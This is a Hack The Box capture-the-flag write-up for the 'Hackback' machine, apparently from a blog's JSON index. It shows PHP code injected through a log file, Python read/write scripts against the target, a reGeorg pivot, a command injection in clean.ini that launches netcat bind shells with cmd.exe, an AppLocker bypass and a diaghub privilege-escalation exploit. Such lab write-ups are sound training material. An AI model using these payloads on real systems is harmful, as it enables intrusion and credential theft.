    "content": "Hackback took me a long time to do. There are so many steps required just to get a shell. For extra difficulty, AppLocker is enabled and an outbound firewall policy is configured to block reverse shells. This box has a bit of everything: fuzzing, php, asp (for pivoting with reGeorg), command injection in a Powershell script, some light reversing. For the privesc, I used the diaghub vulnerability and modified an existing exploit to get a bind shell through netcat.Summary  Find gophish website with default credentials  In gophish templates, find vhosts for fake HTB site and admin portal  Find hidden administration link from obfuscated JS code on the admin portal  Wfuzz different parameters on webadmin page  Determine that the log file name created is the SHA256 checksum of the IP address connecting to the fake HTB website  Use SHA256 as the session ID in the show action of the webadmin page to view logs  Injected PHP code in the log file through the fake HTB site login page and gain ability to read/write files on server  Obtain user simple Windows credentials from web.config.old file extracted from the server  Upload reGeorg tunnel.aspx to pivot to the remote machine  Log in with WinRM through the SOCKS proxy &amp; tunnel using the credentials found in web.config.old  Exploit a command injection vulnerability in the dellog.ps1 script and its associated clean.ini file to gain access to user hacker  Use diaghub exploit to execute arbitrary code and get a bind shell as SYSTEMDetailed stepsNmap scanThe box is running a couple of different HTTP services on various ports: 80, 6666, 64831# nmap -sC -sV -p- 10.10.10.128Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 23:21 ESTNmap scan report for hackback.htb (10.10.10.128)Host is up (0.0093s latency).Not shown: 65532 filtered portsPORT      STATE SERVICE     VERSION80/tcp    open  http        Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server6666/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Site doesn't have a title.64831/tcp open  ssl/unknown| fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.0 404 Not Found|     Content-Type: text/plain; charset=utf-8|     Set-Cookie: _gorilla_csrf=MTU1MTU5NzI5M3xJamQwTlV4NE5reExOMkZXTTNGSE1qTjBjbXBQZVVsd2JIcGlkQ3RzV1cxTGVUZ3pVamxyVFUxdmNuYzlJZ289fCcrRBjaMGfHLMRcgH0dlzGlH8Cy6emg2qDuUnM3RFdx; HttpOnly; Secure|     Vary: Accept-Encoding|     Vary: Cookie|     X-Content-Type-Options: nosniff|     Date: Sun, 03 Mar 2019 07:14:53 GMT|     Content-Length: 19|     page not found|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq: |     HTTP/1.1 400 Bad Request|     Content-Type: text/plain; charset=utf-8|     Connection: close|     Request|   GetRequest: |     HTTP/1.0 302 Found|     Content-Type: text/html; charset=utf-8|     Location: /login?next=%2F|     Set-Cookie: _gorilla_csrf=MTU1MTU5NzI2N3xJbGhVYlVOa2RIbFpOVmw1VFRaMVJ5dHljV3BhU25aVVdtWTBhR2MwYlZsYWJEaG9aR014VDBoNlMwazlJZ289fDWKudYR9rrjWpWCasQcOixRNCRPK5eaVMKphjXIBDPB; HttpOnly; Secure|     Vary: Accept-Encoding|     Vary: Cookie|     Date: Sun, 03 Mar 2019 07:14:27 GMT|     Content-Length: 38|     href=\"/login?next=%2F\"&gt;Found&lt;/a&gt;.|   HTTPOptions: |     HTTP/1.0 302 Found|     Location: /login?next=%2F|     Set-Cookie: _gorilla_csrf=MTU1MTU5NzI2N3xJbVkxUVdwb1FtRjBjM0ZGWm5BdkwzZHRNbkZVTXl0Qk5VWkZaVFZwVjBoaldUSjVTemQ2VG5sR1dsazlJZ289fMGxoxDhwdZVndica_2TocbOxXZbpClx4Ony-cgy4a9K; HttpOnly; Secure|     Vary: Accept-Encoding|     Vary: Cookie|     Date: Sun, 03 Mar 2019 07:14:27 GMT|_    Content-Length: 0| ssl-cert: Subject: organizationName=GophishEnumerating port 80The standard web server on port 80 doesn’t have much except the image of a donkey:I checked for stego but since this is a 40 pts box from the Donkeys team there’s probably not going to be much stego crap on this one.Enumerating port 6666Next I checked out port 6666 and found some custom web application. It errors out expecting commands:I fuzzed the application with wfuzz and found the /help URI we can get a list of the available commands:The commands basically do what they say, they execute some function and provide the output in JSON format:I checked for command injection but didn’t find any parameters that I could pass to the commands. So I moved on to the next port.Enumerating port 64831I can’t use HTTP to connect to port 64381:The nmap scan already picked up that it was running HTTPS, so I switched to HTTPS and found a Gophish application running. Gophish is an Open-Source phishing framework that makes it easy to launch phishing campaigns by using templates and running an integrated webserver to track the results.A quick google search shows that the default credentials for Gophish are admin / gophish. I tried those and was able to log in to the Gophish application:The Gophish database is pretty much empty except there are a few email templates already created:The templates contain a couple of generic fake emails use for phishing. I noticed two interesting vhosts in the templates.Based on the info I found I added www.hackthebox.htb, hackthebox.htb and admin.hackback.htb to my local host file.Fake HTB sitehackthebox.htb doesn’t seem to be a valid vhost but www.hackthebox.htb is working and displays the login prompt for the fake HTB site.The form doesn’t do anything when we enter the credentials, it just loads the same page again. So this is probably not meant to be exploited.Admin pageThe admin.hackback.htb shows a login prompt for an application that I don’t recognize.Both Lost your Password? and Don't have An account? link return a 404 page.I tried a couple of username / password combination but didn’t get anywhere. Again, because this is a hard box, I guessed it wasn’t going to be bruteforcable or anything trivial like this.The HTML comment contains something odd:There’s a link to javascript directory that’s commented out. I tried fetching the js/.js file but got a 404 message. Because directory indexing is disabled, I fired up gobuster and scanned /js for js files.# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x js -u http://admin.hackback.htb/js/private.js (Status: 200)That private.js file contains some obfuscated javascript. I noticed that the ine x= pattern repeats a couple of times in the source code so I figured it must be using some simple character substitution. I pasted the code in CyberChef and tried ROT13:I still don’t know what the code actually does so I just copy/pasted it in my browser’s javascript console and examined each variable after the code was run. I checked the variables in the order in which they appear in the source code.So based on the hidden message, there’s a secret directory /2bb6916122f1da34dcd916421e531578 that should allow us to get access. When I tried to access that directory, I got a 302 redirect instead of a 404 so I knew this was a valid directory.Next I used gobuster to look for any ASP or PHP page in that directory:# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,asp,aspx -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/. (Status: 200)/webadmin.php (Status: 302)If I just browse to /2bb6916122f1da34dcd916421e531578/webadmin.php I get a 302 back to the main page. I checked out the different parameters found in the js file and noted the following:      The list action requires the site parameter set.        If we put an invalid site parameter we get a Wrong target! error mesasge        If we put an invalid password parameter we get a Wrong secret key! error message        The init action expects a session parameter but return a Wrong identifier! when we try a random value        The exec action returns a Missing command error message. I guessed that it’s expecting a command or cmd parameters. Adding cmd returns a Exited x message when we issue a command, where x = the length of the command sent. I couldn’t figure out if any command was being executed or not. I tried some sleep commands to see if anything was being executed but I always got the message back without any delay. I figured this was probably a troll from the Donkeys team so I moved on.  The next thing I did was fuzz the password parameter:# wfuzz -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt \"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&amp;site=hackthebox&amp;password=FUZZ\"==================================================================ID   Response   Lines      Word         Chars          Payload    ==================================================================000001:  C=302      0 L\t       3 W\t     17 Ch\t  \"123456\"000002:  C=302      0 L\t       3 W\t     17 Ch\t  \"12345\"000003:  C=302      0 L\t       3 W\t     17 Ch\t  \"123456789\"000004:  C=302      0 L\t       3 W\t     17 Ch\t  \"password\"000005:  C=302      0 L\t       3 W\t     17 Ch\t  \"iloveyou\"000006:  C=302      0 L\t       3 W\t     17 Ch\t  \"princess\"000007:  C=302      0 L\t       3 W\t     17 Ch\t  \"1234567\"000008:  C=302      7 L\t      15 W\t    197 Ch\t  \"12345678\"000009:  C=302      0 L\t       3 W\t     17 Ch\t  \"abc123\"000010:  C=302      0 L\t       3 W\t     17 Ch\t  \"nicole\"The password 12345678 quickly popped out as shown above.I then tried the GET /2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&amp;site=hackthebox&amp;password=12345678 query on the admin page:Note: I still get a 302 redirect so initially I missed it when I was using the browser to check it. With Burp, it showed up in the response.The list command shows the content of a directory that contains some log files. I tried using the show action to see the content of the log file by specifying the filename in the session parameter but I always got a Wrong identifier! error message. I tried various parameters and I got stuck at this point for a long time until I realized that when I try to log in to the fake HTB website found earlier a new log file is created.The filename is always the same, even after a box reset so there is something unique associated to my own machine. The only thing unique to my session is the IP address from my machine. I checked the SHA256 hash for my IP 10.10.14.23 and I got fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79: a match for the log file name.I tried the show action with the session ID for my IP address: /2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79The log file contains the POST parameters that I sent on the fake HTB site. So at this point I was hoping I could get RCE by injecting PHP code into the logs. I tested this theory by sending the following payload in the password field: &lt;?php echo (1+1); ?&gt;I checked the logs and saw that my PHP was executed:Adding a bunch of PHP code in the same log file can get pretty messy when testing multiple payloads so I clean up the log file everytime I test different payloads by first calling the init action to reset the log file.I tried unsuccessfully to get a reverse shell but realized that all the common functions used for RCE appeared to be blocked. There’s also an outbound firewall configured on the box so we can’t get a connection back.Listing files and directories wasn’t blocked and I could also read files. I wrote a script that does the following:  Cleans up the logfile by calling the init action  If only one parameter is specified, it’ll use the scandir function to list the directory contents  If two parameters are specified, it’ll read the directory + file with the file_get_contents functionWarning, bad python code below:#!/usr/bin/pythonimport base64import requestsimport sys# Clean up the log filer = requests.get(\"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=init&amp;site=hackthebox&amp;password=12345678&amp;session=fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79\");print r.status_codeif len(sys.argv) == 2: # List directories\tdata = {\t\t\"_token\": \"23I6TdlO18ZPtXYQPeHZyAY4Y8Z9wq1ntgvP8YdA\",\t\t\"username\": \"test@test.com\",\t\t\"password\": \"&lt;?php print_r(scandir('%s')); ?&gt;\" % sys.argv[1],\t\t\"submit\": \"\"\t}\tr = requests.post(\"http://www.hackthebox.htb\", data=data)\tprint r.status_code\t# Get output\tr = requests.get(\"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79\", allow_redirects=False);\tprint r.textelif len(sys.argv) == 3: # Fetch a file\t\tdata = {\t\t\"_token\": \"23I6TdlO18ZPtXYQPeHZyAY4Y8Z9wq1ntgvP8YdA\",\t\t\"username\": \"test@test.com\",\t\t\"password\": \"&lt;?php echo(file_get_contents('%s')); ?&gt;\" % (sys.argv[1]+'/'+sys.argv[2]),\t\t\"submit\": \"\"\t}\tr = requests.post(\"http://www.hackthebox.htb\", data=data)\tprint r.status_code\t# Get output\tr = requests.get(\"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79\", allow_redirects=False);\tprint r.text\twith open(\"out.txt\", \"wb\") as f:\t\tf.write((r.text.encode('utf-16')))The output of the script looks like this when enumerating directories:# ./hackback_read.py ..200200[04 March 2019, 12:49:47 AM] 10.10.14.23 - Username: test@test.com, Password: Array(    [0] =&gt; .    [1] =&gt; ..    [2] =&gt; 2bb6916122f1da34dcd916421e531578    [3] =&gt; App_Data    [4] =&gt; aspnet_client    [5] =&gt; css    [6] =&gt; img    [7] =&gt; index.php    [8] =&gt; js    [9] =&gt; logs    [10] =&gt; web.config    [11] =&gt; web.config.old)# ./hackback_read.py ../..200200[04 March 2019, 12:49:54 AM] 10.10.14.23 - Username: test@test.com, Password: Array(    [0] =&gt; .    [1] =&gt; ..    [2] =&gt; admin    [3] =&gt; facebook    [4] =&gt; hackthebox    [5] =&gt; paypal    [6] =&gt; twitter)As we saw above, there’s a web.config file that can potentially contain sensitive information.I downloaded it with ./hackback_read.py ../web.config# ./hackback_read.py ../web.config200200[04 March 2019, 12:51:22 AM] 10.10.14.23 - Username: test@test.com, Password: root@ragingunicorn:~/htb/hackback# cat web.config&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;configuration&gt;   &lt;system.webServer&gt;[...]](root@ragingunicorn:~/htb/hackback# ./hackback_read.py /inetpub/wwwroot/new_phish/admin web.config200200[04 March 2019, 12:53:51 AM] 10.10.14.23 - Username: test@test.com, Password: &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;configuration&gt;    &lt;system.webServer&gt;        &lt;directoryBrowse enabled=\"false\" showFlags=\"None\" /&gt;    &lt;/system.webServer&gt;&lt;/configuration&gt;)Nothing interesting in this one but the web.config.old contains some credentials:# ./hackback_read.py /inetpub/wwwroot/new_phish/admin web.config.old200200[04 March 2019, 12:54:18 AM] 10.10.14.23 - Username: test@test.com, Password: &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;configuration&gt;    &lt;system.webServer&gt;        &lt;authentication mode=\"Windows\"&gt;        &lt;identity impersonate=\"true\"                             userName=\"simple\"             password=\"ZonoProprioZomaro:-(\"/&gt;     &lt;/authentication&gt;        &lt;directoryBrowse enabled=\"false\" showFlags=\"None\" /&gt;    &lt;/system.webServer&gt;&lt;/configuration&gt;Username: simplePassword: ZonoProprioZomaro:-(I can’t use these credentials at the moment since there’s no other service exposed but they’ll be useful later on.Tunneling our way inI can also write files to the target system using the same PHP code execution trick. I wrote another variant of my previous script that uses the file_put_contents function to write files to the disk.#!/usr/bin/pythonimport base64import requestsimport sys# Clean up the log filer = requests.get(\"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=init&amp;site=hackthebox&amp;password=12345678&amp;session=fb6f90c58d1e2f1a7b86546f3300d6d199ac4c0b5309ada3203b2042b3443a56\");print r.status_code# Base64 encoded the file we want to writewith open(sys.argv[2]) as f:\tpayload = base64.b64encode(f.read())# print payloaddata = {\t\"_token\": \"23I6TdlO18ZPtXYQPeHZyAY4Y8Z9wq1ntgvP8YdA\",\t\"username\": \"test@test.com\",\t\"password\": \"&lt;?php echo(file_put_contents(\\\"%s\\\",base64_decode(\\\"%s\\\")));echo ' *****'; ?&gt;\" % (sys.argv[1],payload),\t\"submit\": \"\"}r = requests.post(\"http://www.hackthebox.htb\", data=data)print r.status_code# Call the PHP code to write the filer = requests.get(\"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=fb6f90c58d1e2f1a7b86546f3300d6d199ac4c0b5309ada3203b2042b3443a56\", allow_redirects=False);print r.textI used reGeorg to pivot to the machine. reGeorg has two main components to it: a client-side python script that acts as a local SOCKS proxy and the remote .aspx file running on the target server.To write the .aspx to the webserver directory I used my script above:# ./hackback_write.py \"/inetpub/wwwroot/new_phish/admin/2bb6916122f1da34dcd916421e531578/tunnel.aspx\" tunnel.aspx200200[04 July 2019, 09:55:44 PM] 10.10.14.11 - Username: test@test.com, Password: 4960 *****Then I started the local component of reGeorg:# python reGeorgSocksProxy.py -l 127.0.0.1 -p 1080 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx                         _____  _____   ______  __|___  |__  ______  _____  _____   ______ |     | |   ___||   ___|    ||   ___|/     \\|     | |   ___| |     \\ |   ___||   |  |    ||   ___||     ||     \\ |   |  | |__|\\__\\|______||______|  __||______|\\_____/|__|\\__\\|______|                    |_____|                    ... every office needs a tool like Georg  willem@sensepost.com / @_w_m__  sam@sensepost.com / @trowalts  etienne@sensepost.com / @kamp_staaldraad     [INFO   ]  Log Level set to [INFO][INFO   ]  Starting socks server [127.0.0.1:1080], tunnel at [http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx][INFO   ]  Checking if Georg is ready[INFO   ]  Georg says, 'All seems fine'So now I have a SOCKS proxy listening on port 1080 and tunneling the traffic to the Hackback machine. There are probably some ports listening only on the localhost so I can find out by running nmap through the tunnel. I specify the -sT flag so nmap does a regular TCP socket with the Connect() method and not the default -sS SYN method which doesn’t work with proxychains.# proxychains nmap -sT -p 22,80,135,139,443,445,3389,5985,5986,8080 127.0.0.1ProxyChains-3.1 (http://proxychains.sf.net)Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-05 20:46 EDTNmap scan report for localhost (127.0.0.1)Host is up (0.34s latency).PORT     STATE  SERVICE22/tcp   closed ssh80/tcp   open   http135/tcp  open   msrpc139/tcp  closed netbios-ssn443/tcp  closed https445/tcp  open   microsoft-ds3389/tcp open   ms-wbt-server5985/tcp open   wsman5986/tcp closed wsmans8080/tcp open   http-proxyThere’s a few additional ports open like WinRM and RDP. I can’t RDP in because I don’t have the proper privileges:To connect to WinRM running on port 5985 I used the Alamot’s ruby script. I edited it to put the credentials and the right endpoint.#!/usr/bin/rubyrequire 'winrm'conn = WinRM::Connection.new(  endpoint: 'http://127.0.0.1:5985/wsman',  user: 'hackback\\simple',  password: 'ZonoProprioZomaro:-(',  :no_ssl_peer_verification =&gt; true                            )command=\"\"conn.shell(:powershell) do |shell|    until command == \"exit\\n\" do        output = shell.run(\"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')\")        print(output.output.chomp)        command = gets        output = shell.run(command) do |stdout, stderr|            STDOUT.print stdout            STDERR.print stderr        end    end    puts \"Exiting with code #{output.exitcode}\"endI can connect successfully and now have a shell as user simple:# proxychains ./winrm-simple.rb ProxyChains-3.1 (http://proxychains.sf.net)PS hackback\\simple@HACKBACK Documents&gt;PS hackback\\simple@HACKBACK util&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                               State  ============================= ========================================= =======SeChangeNotifyPrivilege       Bypass traverse checking                  EnabledSeImpersonatePrivilege        Impersonate a client after authentication EnabledSeIncreaseWorkingSetPrivilege Increase a process working set            EnabledPS hackback\\simple@HACKBACK util&gt; net users simpleUser name                    simpleFull Name                    simple[...]Local Group Memberships      *project-managers     *Remote Management Use                             *Users                No user flag yet though.Escalating to user hackerThat WinRM shell was very slow so I spawned a bind shell on port 4442 with netcat to speed things up a little bit.Initially I tried uploading netcat to \\programdata but found out that AppLocker was blocking it so instead I uploaded it to a directory not controlled by AppLocker:./hackback_write.py \"/Windows/System32/spool/drivers/color/nc.exe\" nc.exeC:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe -L -p 4442[...]# proxychains nc -nv 127.0.0.1 4442ProxyChains-3.1 (http://proxychains.sf.net)Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Connected to 127.0.0.1:4442.Microsoft Windows [Version 10.0.17763.292](c) 2018 Microsoft Corporation. All rights reserved.C:\\util&gt;whoamiwhoamihackback\\simpleThere’s an interesting directory c:\\util that contains a bunch of different tools:C:\\util&gt;dir       dir Volume in drive C has no label. Volume Serial Number is 00A3-6B07 Directory of C:\\util07/05/2019  03:11 AM    &lt;DIR&gt;          .07/05/2019  03:11 AM    &lt;DIR&gt;          ..03/08/2007  01:12 AM           139,264 Fping.exe03/29/2017  07:46 AM           312,832 kirbikator.exe12/14/2018  04:42 PM             1,404 ms.hta12/14/2018  04:30 PM    &lt;DIR&gt;          PingCastle02/29/2016  01:04 PM           359,336 PSCP.EXE02/29/2016  01:04 PM           367,528 PSFTP.EXE05/04/2018  12:21 PM            23,552 RawCap.exe               7 File(s)      1,204,017 bytes               3 Dir(s)  92,174,512,128 bytes freeThere’s also an hidden directory c:\\util\\scripts:C:\\util&gt;dir /ah Volume in drive C has no label. Volume Serial Number is 00A3-6B07 Directory of C:\\util12/21/2018  07:21 AM    &lt;DIR&gt;          scripts               0 File(s)              0 bytes               1 Dir(s)  92,174,512,128 bytes freeC:\\util\\scripts&gt;dir Volume in drive C has no label. Volume Serial Number is 00A3-6B07 Directory of C:\\util\\scripts12/21/2018  06:44 AM                84 backup.bat07/05/2019  12:54 AM               402 batch.log12/13/2018  03:56 PM                93 clean.ini12/08/2018  10:17 AM             1,232 dellog.ps107/05/2019  12:54 AM                35 log.txt12/13/2018  03:54 PM    &lt;DIR&gt;          spool               5 File(s)          1,846 bytes               1 Dir(s)  92,184,432,640 bytes freeI guessed that the clean.ini file is somehow used by the dellog.ps1 script as input parameters:C:\\util\\scripts&gt;type clean.initype clean.ini[Main] LifeTime=100 LogFile=c:\\util\\scripts\\log.txtDirectory=c:\\inetpub\\logs\\logfilesC:\\util\\scripts&gt;type dellog.ps1type dellog.ps1Access is denied.I can’t read the dellog.ps1 script but the clean.ini is writable by user simple since he’s a member of the project-managers group:C:\\util\\scripts&gt;icacls clean.iniicacls clean.iniclean.ini NT AUTHORITY\\SYSTEM:(F)          BUILTIN\\Administrators:(F)          HACKBACK\\project-managers:(M)Successfully processed 1 files; Failed processing 0 filesThe LogFile parameter is vulnerable to command injection. The powershell script that wipes the logs uses that parameter to pipe the output of another command so we can use the &amp; character to execute arbitrary commands after the log file has been written to.I uploaded the following batch file that binds a shell on port 4441. The snow.txt file is just there so I can check if the batch file was run by the scheduler.echo check &gt; c:\\programdata\\snow.txtC:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe -L -p 4441# ./hackback_write.py \"/programdata/a.bat\" a.batThen I modified the clean.ini as follows:[Main]LifeTime=9999LogFile=c:\\util\\scripts\\log.txt &amp; c:\\programdata\\a.batDirectory=c:\\users\\hackerI couldn’t upload it directly to c:\\util\\scripts\\clean.ini so I copied it to \\programdata first then copied it over from the command line.root@ragingunicorn:~/htb/hackback# ./hackback_write.py \"/programdata/clean.ini\" clean.iniC:\\util\\scripts&gt;copy c:\\programdata\\clean.ini clean.inicopy c:\\programdata\\clean.ini clean.iniOverwrite clean.ini? (Yes/No/All): yesyes        1 file(s) copied.After a while the batch file is executed (probably some scheduler job set up) and I can connect to the bind shell:# proxychains nc -nv 127.0.0.1 4441ProxyChains-3.1 (http://proxychains.sf.net)Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Connected to 127.0.0.1:4441.Microsoft Windows [Version 10.0.17763.292](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamihackback\\hackerC:\\Windows\\system32&gt;cd \\users\\hacker\\desktopcd \\users\\hacker\\desktopC:\\Users\\hacker\\Desktop&gt;dirdir Volume in drive C has no label. Volume Serial Number is 00A3-6B07 Directory of C:\\Users\\hacker\\Desktop02/09/2019  03:34 PM    &lt;DIR&gt;          .02/09/2019  03:34 PM    &lt;DIR&gt;          ..02/09/2019  03:34 PM                32 user.txt               1 File(s)             32 bytes               2 Dir(s)  92,183,654,400 bytes freeC:\\Users\\hacker\\Desktop&gt;type user.txttype user.txt92244...PrivescThere’s a suspicious service that user hacker can stop &amp; start:C:\\Windows\\system32&gt;sc query userloggerSERVICE_NAME: userlogger         TYPE               : 10  WIN32_OWN_PROCESS          STATE              : 1  STOPPED         WIN32_EXIT_CODE    : 1077  (0x435)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\userlogger    Type    REG_DWORD    0x10    Start    REG_DWORD    0x3    ErrorControl    REG_DWORD    0x1    ImagePath    REG_EXPAND_SZ    c:\\windows\\system32\\UserLogger.exe    ObjectName    REG_SZ    LocalSystem    DisplayName    REG_SZ    User Logger    Description    REG_SZ    This service is responsible for logging user activityI downloaded the file UserLogger.exe to figure out what the service does. When I opened it in IDA I found out it as UPX packed:After unpacking it with upx -d userlogger.exe I was able to open it and see the functions in IDA. I found the function I was looking for. It seems to create a file based on a supplied argument and it also appends .log as the extension.When I started the service with sc start userlogger c:\\windows\\system\\yolo it created the c:\\windows\\system32\\yolo.log file:C:\\Projects&gt;dir c:\\windows\\system32\\yolo.log Volume in drive C has no label. Volume Serial Number is 00A3-6B07 Directory of c:\\windows\\system3207/05/2019  03:25 AM                58 yolo.log               1 File(s)             58 bytes               0 Dir(s)  92,148,129,792 bytes freeC:\\Projects&gt;type c:\\windows\\system32\\yolo.logLogfile specified!Service is startingService is runningI have full privileges to that file:C:\\Projects&gt;icacls c:\\windows\\system32\\yolo.logc:\\windows\\system32\\yolo.log Everyone:(F)Successfully processed 1 files; Failed processing 0 filesSo that means I can replace it with an arbitrary DLL and load it using the Diagnostics Hub Standard Collector Service privilege escalation exploit.I modified the exploit from https://github.com/realoriginal/alpc-diaghubI created a simple DLL that executes netcat to spawn another bind shell on port 4300:I then uploaded both files to their respective directories. The .exe needs to be in /Windows/System32/spool/drivers/color so I can avoid AppLocker.# ./hackback_write.py \"/Windows/System32/spool/drivers/color/ALPC-TaskSched-LPE.exe\" ALPC-TaskSched-LPE.exe# ./hackback_write.py \"/Windows/System32/yolo.log\" PwnDll.dllExecuting the exploit…C:\\Windows\\System32\\spool\\drivers\\color&gt;ALPC-TaskSched-LPE.exeALPC-TaskSched-LPE.exe[+] Loading DLLCreating directory: C:\\Windows\\System32\\spool\\drivers\\color\\..\\..\\..\\..\\..\\programdata\\etw[+] If everything has gone well, you should have a SYSTEM shell!And now I have a bind shell as SYSTEM:# proxychains nc -nv 127.0.0.1 4300ProxyChains-3.1 (http://proxychains.sf.net)Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Connected to 127.0.0.1:4300.Microsoft Windows [Version 10.0.17763.292](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\systemIt looks like the Donkeys have one final troll, the root.txt is hidden and doesn’t contain the flag:C:\\Users\\Administrator\\Desktop&gt;dir /ahdir /ah Volume in drive C has no label. Volume Serial Number is 00A3-6B07 Directory of C:\\Users\\Administrator\\Desktop02/06/2019  11:20 AM               282 desktop.ini02/09/2019  03:37 PM             1,958 root.txt               2 File(s)          2,240 bytes               0 Dir(s)  92,184,543,232 bytes freeC:\\Users\\Administrator\\Desktop&gt;type root.txttype root.txt                                __...----..                             .-'           `-.                            /        .---.._  \\                            |        |   \\  \\ |                             `.      |    | | |        _____                               `     '    | | /    _.-`      `.                                \\    |  .'| //'''.'            \\                                 `---'_(`.||.`.`.'    _.`.'''-. \\                                    _(`'.    `.`.`'.-'  \\\\     \\ \\                                   (' .'   `-._.- /      \\\\     \\ |                                  ('./   `-._   .-|       \\\\     ||                                  ('.\\ | | 0') ('0 __.--.  \\`----'/                             _.--('..|   `--    .'  .-.  `. `--..'               _..--..._ _.-'    ('.:|      .  /   ` 0 `   \\            .'         .-'        `..'  |  / .^.           |           /         .'                 \\ '  .             `._        .'|                              `.  \\`...____.----._.'      .'.'|         .                      \\ |    |_||_||__|     //   \\         |                  _.-'| |_ `.   \\     ||   |         |                     /\\ \\_| _  _ |     ||   |         /.     .              ' `.`.| || ||     ||   /        ' '     |        .     |   `.`---'/   .' `.  |       .' .'`.   \\     .'     /      `...' .'     \\  \\    .'.'     `---\\    '.-'   |)/\\ / /)/ .|    \\             `.   `.\\   \\ )/ \\(   /  \\   |               \\   | `.  `-.  )/     )   |  |             __ \\   \\.-`    \\         |  /|  )  .-.      //' `-|   \\  _   /        / _| |  `-'.-.\\     ||    `.   )_.--'        )  \\ '-.  /  '|     ''.__.-`\\  |        /  `-\\  '._|--'               \\  `.       \\    _\\                       /    `---.       /.--`  \\                      \\    .''''\\       `._..._|                       `-.'  .-. |                                        '_.'-./.'An easy way to “hide” data in CTF challenges on NTFS file systems is to use alternate data streams. Using powershell, I was able to determine that a flag.txt stream is present.PS C:\\Users\\Administrator\\Desktop&gt; get-item -force -path root.txt -stream *PSPath        : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\Administrator\\Desktop\\root.txt::$DATAPSParentPath  : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\Administrator\\DesktopPSChildName   : root.txt::$DATAPSDrive       : CPSProvider    : Microsoft.PowerShell.Core\\FileSystemPSIsContainer : FalseFileName      : C:\\Users\\Administrator\\Desktop\\root.txtStream        : :$DATALength        : 1958PSPath        : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\Administrator\\Desktop\\root.txt:flag.txtPSParentPath  : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\Administrator\\DesktopPSChildName   : root.txt:flag.txtPSDrive       : CPSProvider    : Microsoft.PowerShell.Core\\FileSystemPSIsContainer : FalseFileName      : C:\\Users\\Administrator\\Desktop\\root.txtStream        : flag.txtLength        : 35PS C:\\Users\\Administrator\\Desktop&gt; get-content -force -path root.txt -stream flag.txt6d29b0...Game over, finally!"
  },
  
  {
    "title": "Netmon - Hack The Box",
    "url": "/posts/htb-writeup-netmon/",
    "categories": "hackthebox, infosec",
    "tags": "ftp, prtg, powershell, nishang, config backups",
    "date": "2019-06-29 00:00:00 +0800",
    





    
    "snippet": "I think Netmon had the quickest first blood on HTB yet. The user flag could be grabbed by just using anonymous FTP and retrieving it from the user directory. I guessed the PRTG admin password after...",
